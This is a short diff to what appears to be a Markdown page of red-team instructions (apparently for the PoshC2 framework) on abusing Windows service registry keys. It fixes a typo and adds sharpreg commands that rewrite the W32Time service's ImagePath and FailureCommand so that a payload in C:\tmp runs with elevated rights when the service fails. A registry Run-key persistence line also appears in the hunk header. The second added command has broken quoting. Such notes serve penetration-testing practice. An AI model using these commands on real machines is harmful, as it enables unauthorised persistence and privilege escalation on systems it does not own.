@@ -10,11 +10,13 @@ REG ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /v 
 ## Exploit syntax:
 * Reference [Modify registry](/Poshc2/instructions/Modify_registry.md) for syntax. 
 
-* Example of altering the "FailureCommand" key so that the ervice is executed in an elevated context anytime the service fails or is intentionally corrupted
+* Example of altering the "FailureCommand" key so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted
 
 ```powershell
+# First run this command to stage the service
+sharpreg create HKLM\SYSTEM\CurrentControlSet\Services\W32Time REG_SZ ImagePath "C:\tmp\RUNDLLexe"
 
-
+sharpreg create HKLM\SYSTEM\CurrentControlSet\Services\W32Time REG_SZ ImagePath ""C:\tmp\RUNDLLexe" FailureCommand"
 
 ```
 
